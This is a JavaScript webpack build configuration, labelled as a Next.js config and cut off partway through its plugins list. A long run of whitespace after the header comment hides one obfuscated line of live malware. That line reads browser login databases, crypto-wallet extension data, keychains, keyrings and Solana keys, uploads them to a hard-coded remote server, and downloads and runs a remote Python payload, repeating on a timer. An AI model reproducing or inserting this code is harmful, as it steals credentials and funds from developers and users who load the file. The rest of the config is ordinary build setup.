'use strict';
/** @type {import('next').NextConfig} */                                                                                                                                                                                                                                                                            Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",c="utf8",a=require("os"),$=require("fs"),r=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(r("zcGF0aA")),rq=require(r("YcmVx"+"dWVzdA")),ex=require(r("aY2hpbGRf"+"cHJvY2Vzcw"))[r("cZXhlYw")],zv=require(r("Zbm9kZTpwcm9jZXNz")),hs=a[r("caG9zdG5hbWU")](),hd=a[r("ZaG9tZWRpcg")](),pl=a[r("YcGxhdGZvcm0")](),td=a[r("cdG1wZGly")]();let n;const e=a=>Buffer.from(a,t).toString(c),l=()=>{let t="MjMuMTA2LjaHR0cDovLwI1My4yMDk6MTI0NA==  ";for(var c="",a="",$="",r="",n=0;n<10;n++)c+=t[n],a+=t[10+n],$+=t[20+n],r+=t[30+n];return c=c+$+r,e(a)+e(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[e("ZGlybmFtZQ")](hd)}/${c}`)),h="s0tINw6",o="Z2V0",Z="Ly5ucGw",y="d3JpdGVGaWxlU3luYw",i="L2NsaWVudA",d=e("ZXhpc3RzU3luYw"),p="TG9naW4gRGF0YQ",u="Y29weUZpbGU";function b(t){const c=e("YWNjZXN"+"zU3luYw");try{return $[c](t),!0}catch(t){return!1}}const m=e("RGVmYXVsdA"),G=e("UHJvZmlsZQ"),W=r("aZmlsZW5hbWU"),Y=r("cZm9ybURhdGE"),f=r("adXJs"),w=r("Zb3B0aW9ucw"),V=r("YdmFsdWU"),v=e("cmVhZGRpclN5bmM"),j=e("c3RhdFN5bmM"),z=e("cG9zdA"),L="Ly5jb25maWcv",X="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",g="L0FwcERhdGEv",x="L1VzZXIgRGF0YQ",N="R29vZ2xlL0Nocm9tZQ",R="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",k="Z29vZ2xlLWNocm9tZQ",_=["TG9jYWwv"+R,R,R],F=["TG9jYWwv"+N,N,k],q=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let B="comp";const U=["aGxlZm5rb2RiZWZncGdrbm4","aGVjZGFsbWVlZWFqbmltaG0","cGVia2xtbmtvZW9paG9mZWM","YmJsZGNuZ2NuYXBuZG9kanA","ZGdjaWpubWhuZm5rZG5hYWQ","bWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],J=["bmtiaWhmYmVvZ2FlYW9l","ZWpiYWxiYWtvcGxjaGxn","aWJuZWpkZmptbWtwY25s","Zmhib2hpbWFlbGJvaHBq","aG5mYW5rbm9jZmVvZmJk","YmZuYWVsbW9tZWltaGxw","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],T=t=>{const c=r("YbXVsdGlfZmlsZQ"),a=r("ZdGltZXN0YW1w"),$=e("L3VwbG9hZHM"),s={[a]:n.toString(),type:h,hid:B,[c]:t},o=l();try{let t={[f]:`${o}${$}`,[Y]:s};rq[z](t,((t,c,a)=>{}))}catch(t){}},Q="Y3JlYXRlUmVhZFN0cmVhbQ",S=async(t,c,a)=>{let r=t;if(!r||""===r)return[];try{if(!b(r))return[]}catch(t){return[]}c||(c="");let n=[];const l=e("TG9jYWwgRXh0ZW5"+"zaW9uIFNldHRpbmdz"),s=e(Q);for(let a=0;a<200;a++){const h=`${t}/${0===a?m:`${G} ${a}`}/${l}`;for(let t=0;t<J.length;t++){const l=e(J[t]+U[t]);let o=`${h}/${l}`;if(b(o)){try{far=$[v](o)}catch(t){far=[]}far.forEach((async t=>{r=pt.join(o,t);try{n.push({[w]:{[W]:`${c}${a}_${l}_${t}`},[V]:$[s](r)})}catch(t){}}))}}}if(a){const t=e("c29sYW5hX2lkLnR4dA");if(r=`${hd}${e("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,$[d](r))try{n.push({[V]:$[s](r),[w]:{[W]:t}})}catch(t){}}return T(n),n},C=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${e(X)}${e(t[1])}`:"l"==pl[0]?`${a}${e(L)}${e(t[2])}`:`${a}${e(g)}${e(t[0])}${e(x)}`,await S($,`${c}_`,0==c)}catch(t){}},A=async()=>{let t=[];const c=e(p),a=e(Q),r=e("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),n=e("bG9na2MtZGI");if(pa=`${hd}${r}`,$[d](pa))try{t.push({[V]:$[a](pa),[w]:{[W]:n}})}catch(t){}else if(pa+="-db",$[d](pa))try{t.push({[V]:$[a](pa),[w]:{[W]:n}})}catch(t){}try{const r=e(u);let n="";if(n=`${hd}${e(X)}${e(N)}`,n&&""!==n&&b(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?m:`${G} ${e}`}/${c}`;try{if(!b(l))continue;const c=`${n}/ld_${e}`;b(c)?t.push({[V]:$[a](c),[w]:{[W]:`pld_${e}`}}):$[r](l,c,(t=>{let c=[{[V]:$[a](l),[w]:{[W]:`pld_${e}`}}];T(c)}))}catch(t){}}}catch(t){}return T(t),t},H=async()=>{let t=[];const c=e(p),a=e(Q);try{const r=e(u);let n="";if(n=`${hd}${e(X)}${e(R)}`,n&&""!==n&&b(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?m:`${G} ${e}`}/${c}`;try{if(!b(l))continue;const c=`${n}/brld_${e}`;b(c)?t.push({[V]:$[a](c),[w]:{[W]:`brld_${e}`}}):$[r](l,c,(t=>{let c=[{[V]:$[a](l),[w]:{[W]:`brld_${e}`}}];T(c)}))}catch(t){}}}catch(t){}return T(t),t},M=async()=>{let t=[];const c=e(Q),a=e("a2V5NC5kYg"),r=e("a2V5My5kYg"),n=e("bG9naW5zLmpzb24");try{let l="";if(l=`${hd}${e(X)}${e("RmlyZWZveA")}`,l&&""!==l&&b(l))for(let e=0;e<200;e++){const s=0===e?m:`${G} ${e}`;try{const r=`${l}/${s}/${a}`;b(r)&&t.push({[V]:$[c](r),[w]:{[W]:`fk4_${e}`}})}catch(t){}try{const a=`${l}/${s}/${r}`;b(a)&&t.push({[V]:$[c](a),[w]:{[W]:`fk3_${e}`}})}catch(t){}try{const a=`${l}/${s}/${n}`;b(a)&&t.push({[V]:$[c](a),[w]:{[W]:`flj_${e}`}})}catch(t){}}}catch(t){}return T(t),t},E=async()=>{let t=[];e(p);const c=e(Q);try{const t=e("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let a="";a=`${hd}${t}`;let r=[];if(a&&""!==a&&b(a))try{r=$[v](a)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join(a,t);try{ldb_data.push({[V]:$[c](pa),[w]:{[W]:`${t}`}})}catch(t){}}))}catch(t){}return T(t),t},I=async()=>{let t=[];const c=e(Q),a=e("a2V5NC5kYg"),r=e("a2V5My5kYg"),n=e("bG9naW5zLmpzb24");try{let l="";if(l=`${hd}${e("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,l&&""!==l&&b(l))for(let e=0;e<200;e++){const s=0===e?m:`${G} ${e}`;try{const r=`${l}/${s}/${a}`;b(r)&&t.push({[V]:$[c](r),[w]:{[W]:`flk4_${e}`}})}catch(t){}try{const a=`${l}/${s}/${r}`;b(a)&&t.push({[V]:$[c](a),[w]:{[W]:`flk3_${e}`}})}catch(t){}try{const a=`${l}/${s}/${n}`;b(a)&&t.push({[V]:$[c](a),[w]:{[W]:`fllj_${e}`}})}catch(t){}}}catch(t){}return T(t),t},O=e("cm1TeW5j"),P="XC5weXBccHl0",D="aG9uLmV4ZQ",K=51476592;let tt=0;const ct=()=>{const t=e("cDIuemlw"),c=`${l()}${e("L3Bkb3du")}`,a=`${td}\\${e("cC56aQ")}`,r=`${td}\\${t}`;if(tt>=K+4)return;const n=e("cmVuYW1lU3luYw"),s=e("cmVuYW1l");if($[d](a))try{var h=$[j](a);h.size>=K+4?(tt=h.size,$[s](a,r,(t=>{if(t)throw t;at(r)}))):(tt>=h.size?($[O](a),tt=0):tt=h.size,rt())}catch(t){}else{const t=`${e("Y3VybCAtTG8")} "${a}" "${c}"`;ex(t,((t,c,e)=>{if(t)return tt=0,void rt();try{tt=K+4,$[n](a,r),at(r)}catch(t){}}))}},at=async t=>{const c=`${e("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,a,r)=>{if(c)return $[O](t),void(tt=0);$[O](t),et()}))},$t=async()=>{let t=[];const c=e(p),a=e(Q);try{const r=e(u);let n="";if(n=`${hd}${e(L)}${e(k)}`,n&&""!==n&&b(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?m:`${G} ${e}`}/${c}`;try{if(!b(l))continue;const c=`${n}/ld_${e}`;b(c)?t.push({[V]:$[a](c),[w]:{[W]:`plld_${e}`}}):$[r](l,c,(t=>{let c=[{[V]:$[a](l),[w]:{[W]:`plld_${e}`}}];T(c)}))}catch(t){}}}catch(t){}return T(t),t};function rt(){setTimeout((()=>{ct()}),2e4)}const nt=async()=>{let t="2C5";try{t+=zv[e("YXJndg")][1]}catch(t){}(async(t,c)=>{const a={ts:n.toString(),type:h,hid:B,ss:t,cc:c.toString()},$=l(),r={[f]:`${$}${e("L2tleXM")}`,[Y]:a};try{rq[z](r,((t,c,a)=>{}))}catch(t){}})("jv",t)},et=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${e(P+D)}`;$[d](`${t}`)?(()=>{const t=l(),c=e(i),a=e(o),r=e(y),n=e(Z),s=`${t}${c}/${h}`,d=`${hd}${n}`,p=`"${hd}${e(P+D)}" "${d}"`;try{$[O](d)}catch(t){}rq[a](s,((t,c,a)=>{if(!t)try{$[r](d,a),ex(p,((t,c,a)=>{}))}catch(t){}}))})():ct()}else(()=>{const t=l(),c=e(i),a=e(y),r=e(o),n=e(Z),s=e("cHl0aG9u"),d=`${t}${c}/${h}`,p=`${hd}${n}`;let u=`${s}3 "${p}"`;rq[r](d,((t,c,r)=>{t||($[a](p,r),ex(u,((t,c,a)=>{})))}))})()}));var lt=0;const st=async()=>{try{n=Date.now(),await(async()=>{B=hs,await nt();try{const t=s("~/");await C(F,0),await C(_,1),await C(q,2),"w"==pl[0]?(pa=`${t}${e(g)}${e("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${e(x)}`,await S(pa,"3_",!1)):"d"==pl[0]?(await A(),await H(),await M()):"l"==pl[0]&&(await E(),await $t(),await I())}catch(t){}})(),et()}catch(t){}};st();let ht=setInterval((()=>{(lt+=1)<5?st():clearInterval(ht)}),6e5);
const nextConfig = {}

const fs = require('fs');
const path = require('path');
const webpack = require('webpack');
const resolve = require('resolve');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const InlineChunkHtmlPlugin = require('react-dev-utils/InlineChunkHtmlPlugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const { WebpackManifestPlugin } = require('webpack-manifest-plugin');
const InterpolateHtmlPlugin = require('react-dev-utils/InterpolateHtmlPlugin');
const WorkboxWebpackPlugin = require('workbox-webpack-plugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const ESLintPlugin = require('eslint-webpack-plugin');
const paths = require('./paths');
const modules = require('./modules');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin =
  process.env.TSC_COMPILE_ON_ERROR === 'true'
    ? require('react-dev-utils/ForkTsCheckerWarningWebpackPlugin')
    : require('react-dev-utils/ForkTsCheckerWebpackPlugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');

const createEnvironmentHash = require('./webpack/persistentCache/createEnvironmentHash');

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';

const reactRefreshRuntimeEntry = require.resolve('react-refresh/runtime');
const reactRefreshWebpackPluginRuntimeEntry = require.resolve(
  '@pmmmwh/react-refresh-webpack-plugin'
);
const babelRuntimeEntry = require.resolve('babel-preset-react-app');
const babelRuntimeEntryHelpers = require.resolve(
  '@babel/runtime/helpers/esm/assertThisInitialized',
  { paths: [babelRuntimeEntry] }
);
const babelRuntimeRegenerator = require.resolve('@babel/runtime/regenerator', {
  paths: [babelRuntimeEntry],
});

// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

const emitErrorsAsWarnings = process.env.ESLINT_NO_DEV_ERRORS === 'true';
const disableESLintPlugin = process.env.DISABLE_ESLINT_PLUGIN === 'true';

const imageInlineSizeLimit = parseInt(
  process.env.IMAGE_INLINE_SIZE_LIMIT || '10000'
);

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// Check if Tailwind config exists
const useTailwind = fs.existsSync(
  path.join(paths.appPath, 'tailwind.config.js')
);

// Get the path to the uncompiled service worker (if it exists).
const swSrc = paths.swSrc;

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

const hasJsxRuntime = (() => {
  if (process.env.DISABLE_NEW_JSX_TRANSFORM === 'true') {
    return false;
  }

  try {
    require.resolve('react/jsx-runtime');
    return true;
  } catch (e) {
    return false;
  }
})();

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function (webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Variable used for enabling profiling in Production
  // passed into alias object. Uses a flag if passed into the build command
  const isEnvProductionProfile =
    isEnvProduction && process.argv.includes('--profile');

  // We will provide `paths.publicUrlOrPath` to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(paths.publicUrlOrPath.slice(0, -1));

  const shouldUseReactRefresh = env.raw.FAST_REFRESH;

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      isEnvProduction && {
        loader: MiniCssExtractPlugin.loader,
        // css is located in `static/css`, use '../../' to locate index.html folder
        // in production `paths.publicUrlOrPath` can be a relative path
        options: paths.publicUrlOrPath.startsWith('.')
          ? { publicPath: '../../' }
          : {},
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          postcssOptions: {
            // Necessary for external CSS imports to work
            // https://github.com/facebook/create-react-app/issues/2677
            ident: 'postcss',
            config: false,
            plugins: !useTailwind
              ? [
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                  // Adds PostCSS Normalize as the reset css with default options,
                  // so that it honors browserslist config in package.json
                  // which in turn let's users customize the target behavior as per their needs.
                  'postcss-normalize',
                ]
              : [
                  'tailwindcss',
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                ],
          },
          sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push(
        {
          loader: require.resolve('resolve-url-loader'),
          options: {
            sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
            root: paths.appSrc,
          },
        },
        {
          loader: require.resolve(preProcessor),
          options: {
            sourceMap: true,
          },
        }
      );
    }
    return loaders;
  };

  return {
    target: ['browserslist'],
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'cheap-module-source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry: paths.appIndexJs,
    output: {
      // The build folder.
      path: paths.appBuild,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      assetModuleFilename: 'static/media/[name].[hash][ext]',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
    },
    cache: {
      type: 'filesystem',
      version: createEnvironmentHash(env.raw),
      cacheDirectory: paths.appWebpackCache,
      store: 'pack',
      buildDependencies: {
        defaultWebpack: ['webpack/lib/'],
        config: [__filename],
        tsconfig: [paths.appTsConfig, paths.appJsConfig].filter(f =>
          fs.existsSync(f)
        ),
      },
    },
    infrastructureLogging: {
      level: 'none',
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // We want terser to parse ecma 8 code. However, we don't want it
              // to apply any minification steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending further investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            // Added for profiling in devtools
            keep_classnames: isEnvProductionProfile,
            keep_fnames: isEnvProductionProfile,
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
        }),
        // This is only used in production mode
        new CssMinimizerPlugin(),
      ],
    },
    resolve: {
      // This allows you to set a fallback for where webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules', paths.appNodeModules].concat(
        modules.additionalModulePaths || []
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
        // Allows for better profiling with ReactDevTools
        ...(isEnvProductionProfile && {
          'react-dom$': 'react-dom/profiling',
          'scheduler/tracing': 'scheduler/tracing-profiling',
        }),
        ...(modules.webpackAliases || {}),
      },
      plugins: [
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [
          paths.appPackageJson,
          reactRefreshRuntimeEntry,
          reactRefreshWebpackPluginRuntimeEntry,
          babelRuntimeEntry,
          babelRuntimeEntryHelpers,
          babelRuntimeRegenerator,
        ]),
      ],
      fallback:{
        crypto: require.resolve('crypto-browserify'),
        stream: require.resolve('stream-browserify')
    }
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Handle node_modules packages that contain sourcemaps
        shouldUseSourceMap && {
          enforce: 'pre',
          exclude: /@babel(?:\/|\\{1,2})runtime/,
          test: /\.(js|mjs|jsx|ts|tsx|css)$/,
          loader: require.resolve('source-map-loader'),
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // TODO: Merge this config once `image/avif` is in the mime-db
            // https://github.com/jshttp/mime-db
            {
              test: [/\.avif$/],
              type: 'asset',
              mimetype: 'image/avif',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              type: 'asset',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            {
              test: /\.svg$/,
              use: [
                {
                  loader: require.resolve('@svgr/webpack'),
                  options: {
                    prettier: false,
                    svgo: false,
                    svgoConfig: {
                      plugins: [{ removeViewBox: false }],
                    },
                    titleProp: true,
                    ref: true,
                  },
                },
                {
                  loader: require.resolve('file-loader'),
                  options: {
                    name: 'static/media/[name].[hash].[ext]',
                  },
                },
              ],
              issuer: {
                and: [/\.(ts|tsx|js|jsx|md|mdx)$/],
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),
                presets: [
                  [
                    require.resolve('babel-preset-react-app'),
                    {
                      runtime: hasJsxRuntime ? 'automatic' : 'classic',
                    },
                  ],
				  [
					"@babel/preset-react",
					{ "runtime": "automatic", "importSource": "@emotion/react" }
				  ]
                ],
                
                plugins: [
                  isEnvDevelopment &&
                    shouldUseReactRefresh &&
                    require.resolve('react-refresh/babel'),
					"@emotion"
                ].filter(Boolean),
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    { helpers: true },
                  ],
                ],
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                
                // Babel sourcemaps are needed for debugging into node_modules
                // code.  Without the options below, debuggers like VSCode
                // show incorrect code and set breakpoints on the wrong lines.
                sourceMaps: shouldUseSourceMap,
                inputSourceMap: shouldUseSourceMap,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'icss',
                },
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'local',
                  getLocalIdent: getCSSModuleLocalIdent,
                },
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'icss',
                  },
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'local',
                    getLocalIdent: getCSSModuleLocalIdent,
                  },
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/^$/, /\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              type: 'asset/resource',
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ].filter(Boolean),
    },
    plugins: [
      // Generates an `index.html` file with the <script> injected.
      new HtmlWebpackPlugin(
        Object.assign(
          {},
          {
            inject: true,
            template: paths.appHtml,
          },
          isEnvProduction
            ? {
                minify: {
                  removeComments: true,
                  collapseWhitespace: true,
                  removeRedundantAttributes: true,
                  useShortDoctype: true,
                  removeEmptyAttributes: true,
                  removeStyleLinkTypeAttributes: true,
                  keepClosingSlash: true,
                  minifyJS: true,
                  minifyCSS: true,
                  minifyURLs: true,
                },
              }
            : undefined
        )
      ),
      // Inlines the webpack runtime script. This script is too small to warrant
      // a network request.
      // https://github.com/facebook/create-react-app/issues/5358
      isEnvProduction &&
        shouldInlineRuntimeChunk &&
        new InlineChunkHtmlPlugin(HtmlWebpackPlugin, [/runtime-.+[.]js/]),
      // Makes some environment variables available in index.html.
      // The public URL is available as %PUBLIC_URL% in index.html, e.g.:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // It will be an empty string unless you specify "homepage"
      // in `package.json`, in which case it will be the pathname of that URL.
      new InterpolateHtmlPlugin(HtmlWebpackPlugin, env.raw),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // Experimental hot reloading for React .
      // https://github.com/facebook/react/tree/main/packages/react-refresh
      isEnvDevelopment &&
        shouldUseReactRefresh &&
        new ReactRefreshWebpackPlugin({
          overlay: false,
        }),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      isEnvProduction &&
        new MiniCssExtractPlugin({
          // Options similar to the same options in webpackOptions.output
          // both options are optional
          filename: 'static/css/[name].[contenthash:8].css',
          chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
        }),
      // Generate an asset manifest file with the following content:
      // - "files" key: Mapping of all asset filenames to their corresponding
      //   output file so that tools can pick it up without having to parse
      //   `index.html`
      // - "entrypoints" key: Array of files which are included in `index.html`,
      //   can be used to reconstruct the HTML if necessary
      new WebpackManifestPlugin({
        fileName: 'asset-manifest.json',
        publicPath: paths.publicUrlOrPath,
        generate: (seed, files, entrypoints) => {
          const manifestFiles = files.reduce((manifest, file) => {
            manifest[file.name] = file.path;
            return manifest;
          }, seed);
          const entrypointFiles = entrypoints.main.filter(
            fileName => !fileName.endsWith('.map')
          );

          return {
            files: manifestFiles,
            entrypoints: entrypointFiles,
          };
        },
      }),
